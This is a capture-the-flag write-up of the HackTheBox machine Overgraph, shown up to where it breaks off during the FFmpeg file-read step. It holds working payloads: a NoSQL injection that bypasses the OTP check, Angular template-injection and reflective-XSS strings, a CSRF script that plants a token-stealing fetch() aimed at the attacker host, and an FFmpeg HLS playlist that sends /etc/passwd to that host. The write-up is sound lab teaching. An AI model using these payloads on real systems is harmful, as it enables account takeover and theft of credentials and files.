---
title: HTB: Overgraph
url: https://0xdf.gitlab.io/2022/08/06/htb-overgraph.html
date: 2022-08-06T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-overgraph, ctf, hackthebox, nmap, wfuzz, vhosts, feroxbuster, graphql, angularjs, otp, nosql-injection, graphql-playground, graphql-voyager, local-storage, csti, xss, reflective-xss, csrf, ffmpeg, ssrf, file-read, exploit, patchelf, ghidra, checksec, python, gdb, youtube, pwntools
---

![Overgraph](https://0xdfimages.gitlab.io/img/overgraph-cover.png)

The initial web exploitation in Overgraph was really hard. I’ll have to find and chain together a reflective cross site scripting (XSS), a client side template injection (CSTI), and a cross site request forgery (CSRF) to leak an admin’s token. With that token, I can upload videos, and I’ll exploit FFmpeg to get local file read (one line at a time!), and read the user’s SSH key. For root, there’s a binary to exploit, but it’s actually rather beginner if you skip the heap exploit and just use the arbitrary file write.

## Box Info

| Name | [Overgraph](https://hackthebox.com/machines/overgraph)  [Overgraph](https://hackthebox.com/machines/overgraph) [Play on HackTheBox](https://hackthebox.com/machines/overgraph) |
| --- | --- |
| Release Date | [30 Apr 2022](https://twitter.com/hackthebox_eu/status/1519330569854849025) |
| Retire Date | 06 Aug 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Overgraph |
| Radar Graph | Radar chart for Overgraph |
| First Blood User | 19:40:57[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 21:05:38[ryaagard ryaagard](https://app.hackthebox.com/users/222411) |
| Creator | [Xclow3n Xclow3n](https://app.hackthebox.com/users/172213) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.157
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-26 19:16 UTC
Nmap scan report for 10.10.11.157
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds

oxdf@hacky$ nmap -p22,80 -sCV 10.10.11.157
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-26 19:16 UTC
Nmap scan report for 10.10.11.157
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04.

The website returns a redirect to `graph.htb`.

### Subdomain Fuzz

Given the use of DNS on this host, I’ll fuzz for subdomains:

```

oxdf@hacky$ wfuzz -u http://10.10.11.157 -H "Host: FUZZ.graph.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 178
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.157/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000387:   200        14 L     33 W     607 Ch      "internal"

Total time: 44.34280
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 112.5097

```

I’ll add both to my `/etc/hosts` file:

```
10.10.11.157 graph.htb internal.graph.htb

```

### graph.htb - TCP 80

#### Site

The site is for a company that helps with graph creation:

[![image-20220726164251228](https://0xdfimages.gitlab.io/img/image-20220726164251228.png)](https://0xdfimages.gitlab.io/img/image-20220726164251228.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220726164251228.png)

There’s a contact form at the bottom, but the source shows that it actually POSTs to a `mailto` URL:

![image-20220726164511654](https://0xdfimages.gitlab.io/img/image-20220726164511654.png)

Given that GMail addresses are out of scope for HTB, this seems like nothing interesting.

#### Tech Stack

The page loads as `index.html`, indicating it’s likely a static site. The HTTP response headers just show NGINX:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 26 Jul 2022 20:43:41 GMT
Content-Type: text/html
Content-Length: 6384
Connection: close
Last-Modified: Fri, 08 Apr 2022 17:01:24 GMT
ETag: "18f0-5dc278b672c05-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding

```

If I get a 404 error (like `index.php`), there’s an Apache 404:

![image-20220726165005187](https://0xdfimages.gitlab.io/img/image-20220726165005187.png)

It seems likely that there’s Apache running in a container and NGINX on the host reverse proxying to it.

#### Directory Brute Force

`feroxbuster` doesn’t find anything super interesting:

```

oxdf@hacky$ feroxbuster -u http://graph.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://graph.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      215l      551w     6384c http://graph.htb/
301      GET        9l       28w      297c http://graph.htb/assets => http://graph.htb/assets/
200      GET      268l      602w        0c http://graph.htb/server-status
[####################] - 54s    90000/90000   0s      found:3       errors:0      
[####################] - 54s    30000/30000   555/s   http://graph.htb 
[####################] - 53s    30000/30000   557/s   http://graph.htb/ 
[####################] - 0s     30000/30000   0/s     http://graph.htb/assets => Directory listing (add -e to scan)

```

I will note that it has a `server-status` page, which is an Apache thing, which fits with the 404 page above.

### internal.graph.htb

#### Site

The site presents a login form for Graph Management:

![image-20220726181834700](https://0xdfimages.gitlab.io/img/image-20220726181834700.png)

If I enter an email and password and click “Login”, nothing happens.

#### Request Analysis

Looking in Burp, each time I click, it tries to send a OPTIONS request to `http://internal-api.graph.htb/graphql`:

![image-20220726181945308](https://0xdfimages.gitlab.io/img/image-20220726181945308.png)

Because there’s no DNS response for that domain, no request is sent.

I’ll update `/etc/hosts`, and send again. This time the OPTIONS request returns 204 No Content, and then there’s a POST to the same URL:

```

POST /graphql HTTP/1.1
Host: internal-api.graph.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 280
Origin: http://internal.graph.htb
Connection: close
Referer: http://internal.graph.htb/

{"variables":{"email":"0xdf@0xdf.htb","password":"0xdf0xdf"},"query":"mutation ($email: String!, $password: String!) {\n  login(email: $email, password: $password) {\n    email\n    username\n    adminToken\n    id\n    admin\n    firstname\n    lastname\n    __typename\n  }\n}"}

```

It defines `variables` for `email` and `password`, and also includes the `query` in [GraphQL](https://graphql.org/) (which is also apparent from the path `/graphql`).

#### Tech Stack / Directory Brute Force

The page source in the response is incredibly simple:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 26 Jul 2022 20:51:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Express
Cache-Control: public, max-age=0
Last-Modified: Mon, 07 Feb 2022 03:34:17 GMT
ETag: W/"25f-17ed23f16a8"
Content-Length: 607

<!DOCTYPE html><html lang="en"><head>
  <meta charset="utf-8">
  <title>OneGraph Portal</title>
  <base href="/">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="stylesheet" href="styles.ef46db3751d8e999.css"></head>

<body ng-app="">
  <script src="assets/angular.js"></script>
  <app-root></app-root>
<script src="runtime.aaedba49815d2ab0.js" type="module"></script><script src="polyfills.0cf80192f5858f6f.js" type="module"></script><script src="main.0681ef4e6f13e51b.js" type="module"></script>

</body></html>

```

It’s an [AngularJS](https://angular.io/) application. Angular is a JavaScript framework which loads a really simple HTML page and then the actual page is generated by JavaScript.

Trying to guess an extension is fruitless - anything returns that same page that loads JavaScript. For paths that don’t exist, that JS will redirect to `/` and show an empty page. This wildcard response means that the response looks the same for a valid and invalid page, and thus breaks directory brute force. `feroxbuster` is smart enough to filter that generic response, but it then filters any legit responses as well and returns nothing:

```

oxdf@hacky$ feroxbuster -u http://internal.graph.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.graph.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET       15l       33w      607c Got 200 for http://internal.graph.htb/b6e6f8bbb23849269fedc2753359fba0 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 607 responses; toggle this behavior by using --dont-filter
WLD      GET       15l       33w      607c Got 200 for http://internal.graph.htb/b08fca1358f54b63a370d5e142d36c804845e49d00e64f34bc668a13a13cc6bf890957f2cfbc4a4a909cef4cfd38ac4e (url length: 96)
301      GET       10l       16w      179c http://internal.graph.htb/assets => /assets/
[####################] - 1m     90000/90000   0s      found:3       errors:0      
[####################] - 1m     30002/30000   365/s   http://internal.graph.htb 
[####################] - 1m     30000/30000   366/s   http://internal.graph.htb/ 
[####################] - 1m     30000/30000   366/s   http://internal.graph.htb/assets

```

#### /register

With no way to brute force pages, I will guess at a few potential paths, and `/register` returns a page:

![image-20220727084710647](https://0xdfimages.gitlab.io/img/image-20220727084710647.png)

On entering “0xdf@graph.htb”, it shows a new form:

![image-20220727084821934](https://0xdfimages.gitlab.io/img/image-20220727084821934.png)

It wants to verify that I control the email address before allowing me to register. If I guess a number, the request sent looks like:

```

POST /api/verify HTTP/1.1
Host: internal-api.graph.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 40
Origin: http://internal.graph.htb
Connection: close
Referer: http://internal.graph.htb/

{"email":"0xdf@graph.htb","code":"1236"}

```

I’ll note the path is `/api/verify` using a POST request. The response body looks like:

```

{"result":"Invalid Code"}

```

If I send a few more, on the forth one, it says:

```

{"result":"Invalid otp 4 times, please request for new otp"}

```

Sending a fifth time just replies:

```

{"result":"Invalid email"}

```

So brute forcing the pin doesn’t seem to be an option.

### internal-api.graph.htb

#### Site

Visiting this directly in Firefox returns an error:

![image-20220726191805044](https://0xdfimages.gitlab.io/img/image-20220726191805044.png)

It is a good reminder that when brute-forcing/fuzzing an API, I should try different types of requests, not just GET.

#### /graphql

Visiting `/graphql` brings up a GraphQL query playground:

![image-20220726191925901](https://0xdfimages.gitlab.io/img/image-20220726191925901.png)

[GraphQLVoyager](https://ivangoncharov.github.io/graphql-voyager/) is a great site for visualizing a GraphQL DB. I’ll click “Change Schema” > “Introspection” > “Copy Introspection Query”, and paste that query into the playground. After hitting the play button, it returns JSON, which I’ll paste into Voyager, and get:

![image-20220727064318277](https://0xdfimages.gitlab.io/img/image-20220727064318277.png)

This will come in handy.

The “DOCS” and “SCHEMA” tabs in the playground also show useful information:

![image-20220727125209692](https://0xdfimages.gitlab.io/img/image-20220727125209692.png)

For example, for the `login` mutation, it involves a `User` object with a bunch of fields. `token`, `admin`, and `adminToken` all sound interesting and worth noting.

#### Error Page

I’ll grab the introspection query from Burp and send it to repeater. If I change the body to something to induce a crash, the error messages leak the directory the server is running in, which includes a username:

![image-20220727143737732](https://0xdfimages.gitlab.io/img/image-20220727143737732.png)

I’ll note that for later.

#### Fuzz /api

Running a brute forcer on `http://internal-api.graph.htb` doesn’t turn up anything interesting.

Knowing about `/api`, I’ll try `feroxbuster` again, and it shows a few other paths, but each are part of the process I observed above:

```

oxdf@hacky$ feroxbuster -u http://internal-api.graph.htb/api -m GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal-api.graph.htb/api
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200     POST        1l        4w       36c http://internal-api.graph.htb/api/register
200     POST        1l        4w       40c http://internal-api.graph.htb/api/code
200     POST        1l        4w       40c http://internal-api.graph.htb/api/Code
200     POST        1l        2w       26c http://internal-api.graph.htb/api/verify
200     POST        1l        4w       36c http://internal-api.graph.htb/api/Register
[####################] - 1m     60000/60000   0s      found:5       errors:0
[####################] - 1m     60000/60000   530/s   http://internal-api.graph.htb/api 

```

I do make sure to give it `-m GET,POST` to check both since it’s an API. I could also try other methods, but these are a good start. It’s worth noting that the API appears to be case-insensitive.

## Admin Portal Access

### Management Portal

#### Register Account

If I want to register an account, I’ll have to bypass the pin which was “emailed to me”. I already found that I can’t brute force the pin. I’ll look back at the request where I submit the pin for validation:

```

POST /api/verify HTTP/1.1
Host: internal-api.graph.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 40
Origin: http://internal.graph.htb
Connection: close
Referer: http://internal.graph.htb/

{"email":"0xdf@graph.htb","code":"1237"}

```

I still don’t know what is running on the server, but it’s worth checking for various kinds of injection. SQL injection doesn’t do much, but given the use of JSON structures, NoSQL might make sense.

To test, I’ll request a pin, and then send a random pin with Burp intercept enabled. I’ll modify the request to:

```

{"email":"0xdf@graph.htb","code":{"$ne":"00000"}}

```

This is tricking the system into checking if the code is not “00000”, which is true, so the resulting page is:

![image-20220727120630283](https://0xdfimages.gitlab.io/img/image-20220727120630283.png)

I’ll create an account, and log in.

#### Fighting with Cleanups

The accounts in this portal seem to be cleared every 30 minutes for some reason, so it’s important to note that things will kind of stop working, but not completely log out once that happens. I got all three requests to create an account (`/code`, `/verify`, and `/register`) into Repeater, so when this happened I can just submit them in order and then log in again:

![image-20220727150822866](https://0xdfimages.gitlab.io/img/image-20220727150822866.png)

It’s also important to note that when my account is deleted, not everything stops working, but some parts do. For example, there’s no messages in the inbox any more.

#### Enumerate Page

The page presents a dashboard without much on it:

![image-20220727121727823](https://0xdfimages.gitlab.io/img/image-20220727121727823.png)

Of all the links, only “Dashboard”, Inbox”, “Profile”, and “Tasks And Events” work. The rest just lead back to the login page.

`/inbox` shows a single message from Larry curious about how I got access:

![image-20220727121854243](https://0xdfimages.gitlab.io/img/image-20220727121854243.png)

The site is a bit flaky, but I can send a message back (sometimes I’ll have to refresh to see it):

![image-20220727122357248](https://0xdfimages.gitlab.io/img/image-20220727122357248.png)

If there’s a link in my message, it seems to be clicked immediately:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.157 - - [27/Jul/2022 15:00:57] code 404, message File not found
10.10.11.157 - - [27/Jul/2022 15:00:57] "GET /larry HTTP/1.1" 404 -

```

`/profile` gives a form to update my account profile:

![image-20220727123150910](https://0xdfimages.gitlab.io/img/image-20220727123150910.png)

This includes password change as well as giving myself a first and last name, which it seems are set to `null` by default. Playing with it a bit, only the first and last fields are actually editable. The sidebar on all these pages does show this name:

![image-20220727123253203](https://0xdfimages.gitlab.io/img/image-20220727123253203.png)

`/tasks` seems to just have a bunch of static stuff that isn’t interacted with:

![image-20220727123329843](https://0xdfimages.gitlab.io/img/image-20220727123329843.png)

#### Dev Tools

On logging in, the site assigns a JWT token as a Cookie that’s named `auth`:

![image-20220727131203143](https://0xdfimages.gitlab.io/img/image-20220727131203143.png)

There are protections in place. `HttpOnly` means that the cookie cannot be accessed via JavaScript.

There’s also information about my user stored in `localStorage`:

![image-20220727131446589](https://0xdfimages.gitlab.io/img/image-20220727131446589.png)

It matches relatively closely with the schema observed via the GraphQL Playground, but `token` and `adminToken` are not present.

#### Enable Uploads

If I change `admin` to `true` in Local Storage and refresh, there’s a new additional item in the sidebar menu that goes to `/uploads`:

![image-20220727134042508](https://0xdfimages.gitlab.io/img/image-20220727134042508.png)

#### Enable Uploads Submit

This form will allow me to select a file, but the Submit button doesn’t generate any traffic. Given that `admin` had to be set to true to access this page, it might make sense that either `token` and/or `adminToken` must be set to use it.

`token` doesn’t seem to matter, but once I set `adminToken` to anything, refresh the page, select a file, and then click Submit, there is network traffic:

```

POST /admin/video/upload HTTP/1.1
Host: internal-api.graph.htb
Content-Length: 17345076
admintoken: 62e17672568b5804349422ce
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCVKMumeXkb9d8wlV
Accept: */*
Origin: http://internal.graph.htb
Referer: http://internal.graph.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
------WebKitFormBoundaryCVKMumeXkb9d8wlV
Content-Disposition: form-data; name="file"; filename="sample_960x400_ocean_with_audio.mkv"
Content-Type: video/x-matroska

...[snip content]...
------WebKitFormBoundaryCVKMumeXkb9d8wlV--

```

There is an `admintoken` header in the request generated from the local storage `adminToken`.

The response says the token is invalid:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 27 Jul 2022 17:53:28 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: http://internal.graph.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"1c-6dX9+qeUsM2sLzHirV97ABSilFs"
Content-Length: 28

{"result": "Invalid Token" }

```

And that shows on the page:

![image-20220727135434637](https://0xdfimages.gitlab.io/img/image-20220727135434637.png)

I’m going to need an admin token to upload.

### CSTI in Names

#### Update Names

I noted above that on creating an account, the first and last name fields are set to “null”, which shows up at the top left of the dashboard:

![image-20220727145236202](https://0xdfimages.gitlab.io/img/image-20220727145236202.png)

In `/profile`, these two fields (and only these two) are updatable. On updating them and clicking “Save Changes”, the sidebar updates as well:

![image-20220727145432645](https://0xdfimages.gitlab.io/img/image-20220727145432645.png)

These values also update in Local Storage:

![image-20220727145634364](https://0xdfimages.gitlab.io/img/image-20220727145634364.png)

#### Update Request

On updating the names, the following HTTP request is generated:

```

POST /graphql HTTP/1.1
Host: internal-api.graph.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 444
Origin: http://internal.graph.htb
Connection: close
Referer: http://internal.graph.htb/
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTE4OTliNTY4YjU4MDQzNDk0MjJlMSIsImVtYWlsIjoiMHhkZkBncmFwaC5odGIiLCJpYXQiOjE2NTg5NDgxMzQsImV4cCI6MTY1OTAzNDUzNH0.MRCXtBi8anl_SHslBCsDxaNv6zG29hOHXBN22uMQbtc
Pragma: no-cache
Cache-Control: no-cache

{"operationName":"update","variables":{"firstname":"0xdf","lastname":"fdx0","id":"62e18bc9568b5804349422fb","newusername":"0xdf"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}

```

To submit this form, I must know the `id` for the user to change. I did some playing with the `newusername` field, but I wasn’t able to change my username.

#### CSTI POC

I’ll try a template injection payload like `{{ 7*7 }}` in the only two editable fields:

![image-20220727150531292](https://0xdfimages.gitlab.io/img/image-20220727150531292.png)

Both are vulnerable.

Looking in Local Storage, it’s the unexecuted data still:

![image-20220727150605298](https://0xdfimages.gitlab.io/img/image-20220727150605298.png)

This is very similar to a server-side template injection (SSTI), except that the injection is happening client-side, in the JavaScript on the local user’s browser. So poisoning my own user isn’t very useful, but if I can get this kind of payload into the database for another user, I can potentially execute JavaScript on their browser.

#### Exfil Admin Token

Since it seems likely that having the `adminToken` of a real admin is going to be useful, I’ll use this CSTI to collect it. HackTricks has a [nice page on Angular CSTI](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti#angularjs) which provides this payload:

```

{{constructor.constructor('alert(1)')()}}

```

I’ll update my first name and on clicking Save:

![image-20220727151549853](https://0xdfimages.gitlab.io/img/image-20220727151549853.png)

To leak the value from Local Storage, I’ll make sure mine exists (it gets cleared each time my account is nuked), and try this payload:

```

{{constructor.constructor('fetch("http://10.10.14.6/" + localStorage.getItem("adminToken"))')()}}

```

On submitting this as my name, there’s a request at my Python webserver:

```
10.10.14.6 - - [27/Jul/2022 18:01:55] code 404, message File not found
10.10.14.6 - - [27/Jul/2022 18:01:55] "GET /fakeAdminToken HTTP/1.1" 404 -
10.10.14.6 - - [27/Jul/2022 18:01:55] code 404, message File not found
10.10.14.6 - - [27/Jul/2022 18:01:55] "GET /fakeAdminToken HTTP/1.1" 404 -

```

Looking in the Dev Tools console, it seems the request to my VM was blocked twice, and yet, there are hits:

![image-20220727152353617](https://0xdfimages.gitlab.io/img/image-20220727152353617.png)

### Attempt to Update Larry

#### Get Larry’s UserID

To get that CSTI payload run by Larry, I’ll need to get it into the GraphQL as their first or last name. To do this, I’ll need to at a minimum know Larry’s (it’s not clear to me at this point if that’s enough, or if I’ll have to find a way to get Larry to send the POST to make the change).

Looking at the GraphQL Schema in the Playground and in Voyager, there’s a Query named `tasks` that takes a required `username` and returns a list of tasks:

![image-20220727155346944](https://0xdfimages.gitlab.io/img/image-20220727155346944.png)

I’ll run a query like this in the Playground and get the tasks assigned to Larry:

![image-20220727155810208](https://0xdfimages.gitlab.io/img/image-20220727155810208.png)

There’s only one, but having the `Assignedto` gives me the user ID for Larry.

#### Update Larry’s Name - Fail

With this ID, I can create a request to update my profile, and send that request to Burp Repeater. I’m able to send the request from Repeater without issue, so there’s no CSRF check or anything like that. The body of the POST is:

![image-20220727160249022](https://0xdfimages.gitlab.io/img/image-20220727160249022.png)

I’ll try updating the `id` field to Larry’s. When I send this, it fails:

![image-20220727160355388](https://0xdfimages.gitlab.io/img/image-20220727160355388.png)

It seems that a user can only update their own profile, or at least that I can’t update Larry’s profile. I’ll need to get Larry to do it.

### Reflective XSS

#### Identify

I’ve got almost all the pieces for the attack here, but I need some way to get Larry to make the HTTP request to change their name. There’s a reflective XSS vulnerability in `graph.htb`. Looking at the page source (after JS has run), it’s right at the top:

![image-20220727165559322](https://0xdfimages.gitlab.io/img/image-20220727165559322.png)

`window.location.search` returns everything after (and including) the `?` in a URL. In this case, it’s splitting on `=`, so if the URL ends in `?redirect=[url]`, then `[url]` will be passed into `window.location.replace`.

`window.location.replace` takes a URL and replaces the current resource with what’s at that URL.

#### Weaponize

At this point, all I’ve got is an open redirect (which is dangerous on its own), but to make this a reflective XSS, I’ll take advantage of the [JavaScript URL Protocol](https://docs.microsoft.com/en-us/previous-versions/aa767736(v=vs.85)). If a URL is of the form `javascript:[script]`, the stuff in `[script]` will be run as JavaScript.

To test this, I’ll visit `graph.htb/?redirect=javascript:alert(1)`:

![image-20220727170135294](https://0xdfimages.gitlab.io/img/image-20220727170135294.png)

#### Load Arbitrary JavaScript

I’ll play around with a URL in Firefox to get something that will load and execute arbitrary JavaScript from my server. With `alert.js` being a simple `alert(1)`, this URL works to pop an alert:

```

http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D%27%3Cscript%20src%3d%22http://10.10.14.6/alert.js%22%3E%3C/script%3E%27

```

![image-20220727171640868](https://0xdfimages.gitlab.io/img/image-20220727171640868.png)

I’ll generate a similar link to send to Larry:

```

http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D'<script%20src%3d"http://10.10.14.6/csrf.js"></script>'

```

It’s important that certain characters are URL-encoded, and that there are no spaces. On sending:

```
10.10.11.157 - - [27/Jul/2022 19:57:11] code 404, message File not found
10.10.11.157 - - [27/Jul/2022 19:57:11] "GET /csrf.js HTTP/1.1" 404 -

```

A browser on Overgraph is requesting `csrf.js`. That’s promising!

This JS will run in the context of `graph.htb`, so I can’t directly request the `adminToken` from here.

### Exfil adminToken

#### Strategy

Pulling this all together, I’ll send Larry a link with the reflective XSS payload to load JavaScript from my server.

That Javascript will generate a CRSF to hit the API to change Larry’s last name to the CSTI payload.

Once that succeeds, when Larry next checks anything on the dashboard, the CSTI will fire, sending Larry’s `adminToken` to me.

#### CSRF JavaScript

I’ll write a small JavaScript file that will generate this the request to change the last name:

```

var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
        operationName: "update",
        variables: {
                firstname: "larry",
                lastname: "{{constructor.constructor('fetch(\"http://10.10.14.6/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}",
                id: "62e18b328f897413e4559cd6",
                newusername: "larry"
        },
        query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}"
});
req.send(body);

```

It’s important to send it as `text/plain` and not `application/json`. I’m not 100% sure why, but a lot of writeups on bug bounties that I came across made this switch, and it does still work at the server.

#### Exploit

I’ll send a link to Larry:

![image-20220727202118391](https://0xdfimages.gitlab.io/img/image-20220727202118391.png)

A few seconds later, there’s a request for `csrf.js` at my webserver:

```
10.10.11.157 - - [27/Jul/2022 23:00:30] "GET /csrf.js HTTP/1.1" 200 -

```

Then, a few seconds after that, the token:

```
10.10.11.157 - - [27/Jul/2022 23:00:36] code 404, message File not found
10.10.11.157 - - [27/Jul/2022 23:00:36] "GET /token?adminToken=c0b9db4c8e4bbb24d59a3aaffa8c8b83 HTTP/1.1" 404 -

```

## Shell as user

### Enumerate

With I’ll add the `adminToken` to the local storage in Dev Tools:

![image-20220727202344018](https://0xdfimages.gitlab.io/img/image-20220727202344018.png)

Now when I go to `/uploads`, select a small `.mkv` file, and click Submit, there’s a message suggesting it was successful:

![image-20220727202426297](https://0xdfimages.gitlab.io/img/image-20220727202426297.png)

### ffmpeg

#### Strategy

The text on the upload page says the video will be “converted on the backend”. This implies some kind of automated processing of the uploaded video. If a Linux tool is being used on the video, it is almost certainly [FFmpeg](https://ffmpeg.org/).

#### Local File Read POC

Some Googling for recent vulnerabilities in FFmpeg turns up [this hackerone report](https://hackerone.com/reports/1062888), which shows how to abuse FFmpeg with a SSRF and a local file read.

First I’ll create a `header.m3u8` file in a web directory. It’s important that that file not have anything after that last `?` character ([this StackOverflow answer](https://stackoverflow.com/a/16114535) shows how to do that in `vim`), which can be verified with `xxd`:

```

oxdf@hacky$ vim -b header.m3u8 
oxdf@hacky$ xxd header.m3u8
00000000: 2345 5854 4d33 550a 2345 5854 2d58 2d4d  #EXTM3U.#EXT-X-M
00000010: 4544 4941 2d53 4551 5545 4e43 453a 300a  EDIA-SEQUENCE:0.
00000020: 2345 5854 494e 463a 2c0a 6874 7470 3a2f  #EXTINF:,.http:/
00000030: 2f31 302e 3130 2e31 342e 363f            /10.10.14.6?

```

Next, `mal.avi` just will trigger the call to get `header.m3u8`:

```

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.6/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST

```

It’s using the FFmpeg `concat` [protocol](https://ffmpeg.org/ffmpeg-protocols.html#concat) and `file` [protocol](https://ffmpeg.org/ffmpeg-protocols.html#file) to and exploiting a bug that will cause that URL to be visited, leaking (at least part of) the file.

On uploading `mal.avi`, there’s hit at the webserver, including a request for the header file and then exfil data:

```
10.10.11.157 - - [28/Jul/2022 09:45:21] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [28/Jul/2022 09:45:21] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 301 -

```

That’s the first line of an `/etc/passwd` file. Unfortunately, it gets cut at any newline character.

#### Read Next Line

